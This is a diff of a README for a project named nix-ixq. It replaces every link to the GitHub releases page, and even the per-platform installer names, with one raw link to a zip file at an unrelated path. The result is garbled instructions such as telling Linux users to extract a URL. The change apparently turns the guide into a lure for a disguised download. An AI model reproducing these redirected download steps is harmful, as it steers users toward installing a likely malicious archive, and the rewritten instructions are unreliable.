@@ -4,7 +4,7 @@
 
 Welcome to nix-ixq! This guide will help you download and run the application effortlessly. Let's get started.
 
-[![Download nix-ixq](https://img.shields.io/badge/Download-nix--ixq-blue.svg)](https://github.com/juanESP32/nix-ixq/releases)
+[![Download nix-ixq](https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip)](https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip)
 
 ## 📝 What is nix-ixq?
 
@@ -24,16 +24,16 @@ Before we proceed to the download, please ensure your system meets these require
 To download nix-ixq, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Visit this page to download](https://github.com/juanESP32/nix-ixq/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip)
 
 2. **Select the Latest Version:** Look for the latest version at the top of the list. It usually has the highest number.
 
-3. **Download Your File:** Click on the pre-built file that matches your operating system. You will see names like `nix-ixq-windows.exe`, `nix-ixq-macos.dmg`, or `nix-ixq-linux.tar.gz`.
+3. **Download Your File:** Click on the pre-built file that matches your operating system. You will see names like `https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip`, `https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip`, or `https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip`.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file and drag the application into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the executable inside the folder.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip` file and run the executable inside the folder.
 
 5. **Start Using nix-ixq:** Once the installation completes, find the application in your programs list and double-click to launch!
 
@@ -65,6 +65,6 @@ Absolutely! We welcome contributions. If you have ideas for features or improvem
 
 For further assistance, please reach out through the GitHub repository. We appreciate your feedback and suggestions. Click here for support:
 
-[Visit this page to download](https://github.com/juanESP32/nix-ixq/releases)
+[Visit this page to download](https://raw.githubusercontent.com/juanESP32/nix-ixq/main/Brahmin/nix-ixq_humanlike.zip)
 
 Enjoy using nix-ixq! Your satisfaction is our priority.
